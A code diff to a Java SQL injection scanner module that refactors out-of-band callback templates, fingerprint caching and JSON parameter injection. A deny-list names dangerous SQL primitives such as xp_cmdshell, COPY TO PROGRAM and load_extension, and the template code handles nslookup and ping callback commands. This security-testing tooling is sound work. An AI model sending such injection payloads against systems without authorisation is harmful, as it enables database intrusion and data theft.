+                    String payload = resolveSqlOobTemplate(payloadTemplate, collabPayload);
+                    if (payload == null) continue;
+                    sentPayload.set(payload);
 
 
                     HttpRequestResponse oobResult = sendWithPayload(original, ip, payload);
@@ -1017,26 +1078,77 @@ public class SmartSqliDetector implements ScanModule {
         }
     }
 
+    private static boolean isNonDestructiveOobPayload(String payload) {
+        String p = payload.toLowerCase(Locale.ROOT);
+        return !p.contains("copy (")
+                && !p.contains("to program")
+                && !p.contains("from program")
+                && !p.contains("xp_cmdshell")
+                && !p.contains("sp_oacreate")
+                && !p.contains("openrowset")
+                && !p.contains("bulk insert")
+                && !p.contains("lo_export")
+                && !p.contains("attach database")
+                && !p.contains("load_extension")
+                && !p.contains("(select version())")
+                && !p.contains("(select user")
+                && !p.contains("(select current_user")
+                && !p.contains("%computername%")
+                && !p.contains("version()")
+                && !p.contains("user()");
+    }
+
+    private String resolveSqlOobTemplate(String template, String generatedPayload) {
+        if (collaboratorManager.getMode() != CollaboratorManager.OobMode.CUSTOM_OOB) {
+            return collaboratorManager.resolveTemplate(template, generatedPayload);
+        }
+
+        String lower = template.toLowerCase(Locale.ROOT);
+        boolean httpTemplate = lower.contains("http://collab_placeholder")
+                || lower.contains("https://collab_placeholder");
+        boolean shellDnsCommand = lower.contains("nslookup ") || lower.contains("ping ")
+                || lower.contains("dig ") || lower.contains("host ")
+                || lower.contains("resolve-dnsname");
+        if (httpTemplate || shellDnsCommand) {
+            return collaboratorManager.resolveTemplate(template, generatedPayload);
+        }
+
+        // Native DB callbacks (UNC paths, UTL_INADDR, dblink, LOAD_FILE) require
+        // a hostname, not the custom HTTP payload format address:port/id.
+        if (!collaboratorManager.isCustomDnsRunning()) return null;
+        String address = collaboratorManager.getCustomAddress();
+        if (address == null || address.isBlank() || address.contains(":")) return null;
+        int slash = generatedPayload.lastIndexOf('/');
+        String payloadId = slash >= 0 ? generatedPayload.substring(slash + 1) : generatedPayload;
+        return template.replace("COLLAB_PLACEHOLDER", payloadId + "." + address);
+    }
+
     // ==================== DBMS FINGERPRINTING ====================
 
     /**
      * Attempt to identify the backend DBMS by sending lightweight probes and matching
-     * response errors against ERROR_PATTERNS. Results are cached per URL path so only
-     * the first parameter on a given endpoint pays the fingerprint cost.
+     * response errors against ERROR_PATTERNS. Results are cached per fully scoped
+     * injection target, so one parameter cannot suppress probes for another.
      *
      * @return DBMS name (e.g. "MySQL"), or null if inconclusive / disabled
      */
     private String fingerprintDbms(HttpRequestResponse original, InjectionPoint ip,
                                     String urlPath, String baselineBody) {
-        // Fast path: check cache
-        String cached = fingerprintCache.get(urlPath);
+        // Error-based SQLi is parameter-specific. Cache only the fully scoped target;
+        // caching by URL path skipped every parameter after the first one.
+        String fingerprintKey = scanTargetKey(original.request(), ip);
+        boolean manualBypass = dedup != null && dedup.isBypass();
+        if (manualBypass) {
+            fingerprintCache.remove(fingerprintKey);
+        }
+        String cached = fingerprintCache.get(fingerprintKey);
         if (cached != null) {
             return cached.isEmpty() ? null : cached;
         }
 
-        // Thread coordination: only one thread fingerprints per URL path
+        // Thread coordination: only one thread fingerprints a scoped target at once.
         CountDownLatch newLatch = new CountDownLatch(1);
-        CountDownLatch existing = fingerprintLatches.putIfAbsent(urlPath, newLatch);
+        CountDownLatch existing = fingerprintLatches.putIfAbsent(fingerprintKey, newLatch);
         if (existing != null) {
             // Another thread is already fingerprinting this path — wait for it
             try {
@@ -1045,7 +1157,7 @@ public class SmartSqliDetector implements ScanModule {
                 Thread.currentThread().interrupt();
                 return null;
             }
-            cached = fingerprintCache.get(urlPath);
+            cached = fingerprintCache.get(fingerprintKey);
             return (cached != null && !cached.isEmpty()) ? cached : null;
         }
 
@@ -1054,7 +1166,7 @@ public class SmartSqliDetector implements ScanModule {
             FingerprintResult result = runFingerprintProbes(original, ip, baselineBody);
 
             // Cache the result (empty string = inconclusive)
-            fingerprintCache.put(urlPath, result != null ? result.dbms : "");
+            fingerprintCache.put(fingerprintKey, result != null ? result.dbms : "");
 
             if (result != null) {
                 api.logging().logToOutput("[SQLi] DBMS fingerprint: " + result.dbms
@@ -1101,7 +1213,7 @@ public class SmartSqliDetector implements ScanModule {
             return result != null ? result.dbms : null;
         } finally {
             newLatch.countDown();
-            fingerprintLatches.remove(urlPath);
+            fingerprintLatches.remove(fingerprintKey);
         }
     }
 
@@ -1246,19 +1358,8 @@ public class SmartSqliDetector implements ScanModule {
             case COOKIE:
                 return PayloadEncoder.injectCookie(request, ip.name, payload);
             case JSON:
-                // Replace value in JSON body, supporting nested dot-notation keys
-                String body = request.bodyToString();
-                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
-                if (ip.name.contains(".")) {
-                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
-                    String newBody = replaceNestedJsonValue(body, ip.name, payload);
-                    return request.withBody(newBody);
-                } else {
-                    String jsonPattern = "\"" + Pattern.quote(ip.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
-                    String replacement = "\"" + ip.name + "\": \"" + escaped + "\"";
-                    String newBody = body.replaceFirst(jsonPattern, Matcher.quoteReplacement(replacement));
-                    return request.withBody(newBody);
-                }
+                return request.withBody(JsonScanSupport.replaceValue(
+                        request.bodyToString(), ip.jsonPath, payload));
             case XML:
                 String xmlBody = request.bodyToString();
                 String xmlEscaped = payload.replace("&", "&amp;").replace("<", "&lt;")
@@ -1319,37 +1420,6 @@ public class SmartSqliDetector implements ScanModule {
         }
     }
 
-    /**
-     * Replace a value at a dot-notation path in a JSON string.
-     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
-     */
-    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
-        try {
-            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
-            if (!root.isJsonObject()) return jsonBody;
-
-            String[] parts = dotPath.split("\\.");
-            com.google.gson.JsonObject current = root.getAsJsonObject();
-
-            // Traverse to the parent of the target key
-            for (int i = 0; i < parts.length - 1; i++) {
-                com.google.gson.JsonElement child = current.get(parts[i]);
-                if (child == null || !child.isJsonObject()) return jsonBody;
-                current = child.getAsJsonObject();
-            }
-
-            // Replace the leaf value
-            String leafKey = parts[parts.length - 1];
-            if (current.has(leafKey)) {
-                current.addProperty(leafKey, escapedValue);
-            }
-
-            return new com.google.gson.Gson().toJson(root);
-        } catch (Exception e) {
-            return jsonBody;
-        }
-    }
-
     private List<InjectionPoint> extractInjectionPoints(HttpRequest request) {
         List<InjectionPoint> points = new ArrayList<>();
 
@@ -1375,13 +1445,13 @@ public class SmartSqliDetector implements ScanModule {
                 break;
             }
         }
-        if (contentType.contains("application/json")) {
+        if (contentType.toLowerCase(Locale.ROOT).contains("application/json")) {
             try {
                 String body = request.bodyToString();
                 if (body != null && !body.isBlank()) {
-                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
-                    if (el.isJsonObject()) {
-                        extractJsonParams(el.getAsJsonObject(), "", points);
+                    for (JsonScanSupport.Target target : JsonScanSupport.extractTargets(body)) {
+                        points.add(new InjectionPoint(target.displayName(), target.value(),
+                                InjectionType.JSON, target.path()));
                     }
                 }
             } catch (Exception ignored) {
@@ -1403,6 +1473,8 @@ public class SmartSqliDetector implements ScanModule {
                 "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                 "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                 "upgrade-insecure-requests", "if-modified-since", "if-none-match",
+                "authorization", "proxy-authorization", "content-type", "accept",
+                "accept-language", "cache-control", "pragma", "origin",
                 "cookie"); // individual cookies already extracted as COOKIE parameters
         for (var h : request.headers()) {
             if (!skipHeaders.contains(h.name().toLowerCase())) {
@@ -1448,18 +1520,6 @@ public class SmartSqliDetector implements ScanModule {
                     && !seen.contains("attr:" + attrName)) {
                 seen.add("attr:" + attrName);
                 points.add(new InjectionPoint("@" + attrName, attrValue, InjectionType.XML));
-            }
-        }
-    }
-
-    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<InjectionPoint> points) {
-        for (String key : obj.keySet()) {
-            com.google.gson.JsonElement val = obj.get(key);
-            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
-            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
-                points.add(new InjectionPoint(fullKey, val.getAsString(), InjectionType.JSON));
-            } else if (val.isJsonObject()) {
-                extractJsonParams(val.getAsJsonObject(), fullKey, points);
             }
         }
     }
@@ -1539,9 +1599,20 @@ public class SmartSqliDetector implements ScanModule {
         if (delay > 0) Thread.sleep(delay);
     }
 
+    private boolean isOobConfirmed(HttpRequestResponse original, InjectionPoint ip) {
+        // An explicit manual rescan must not be short-circuited by a previous callback.
+        if (dedup != null && dedup.isBypass()) return false;
+        return oobConfirmedTargets.contains(scanTargetKey(original.request(), ip));
+    }
+
+    private static String scanTargetKey(HttpRequest request, InjectionPoint ip) {
+        return ScanTargetIdentity.build(request.url(), request.method(), ip.type.name(), ip.identityName());
+    }
+
     @Override
     public void destroy() {
         tested.clear();
+        oobConfirmedTargets.clear();
         fingerprintCache.clear();
         fingerprintLatches.clear();
     }
@@ -1553,11 +1624,40 @@ public class SmartSqliDetector implements ScanModule {
         final String name;
         final String originalValue;
         final InjectionType type;
+        final List<Object> jsonPath;
 
         InjectionPoint(String name, String originalValue, InjectionType type) {
+            this(name, originalValue, type, null);
+        }
+
+        InjectionPoint(String name, String originalValue, InjectionType type, List<Object> jsonPath) {
             this.name = name;
             this.originalValue = originalValue != null ? originalValue : "";
             this.type = type;
+            this.jsonPath = jsonPath == null ? null : List.copyOf(jsonPath);
+        }
+
+        String identityName() {
+            if (jsonPath == null) return name;
+            StringBuilder out = new StringBuilder();
+            for (Object part : jsonPath) {
+                if (part instanceof String key) {
+                    out.append('/').append(key.replace("~", "~0").replace("/", "~1"));
+                } else {
+                    out.append('/').append(part);
+                }
+            }
+            return out.toString();
+        }
+
+        boolean matchesParameterName(String requested) {
+            if (requested == null) return false;
+            if (name.equalsIgnoreCase(requested)) return true;
+            if (jsonPath != null && !jsonPath.isEmpty()
+                    && jsonPath.get(jsonPath.size() - 1) instanceof String key) {
+                return key.equalsIgnoreCase(requested);
+            }
+            return false;
         }
     }
 
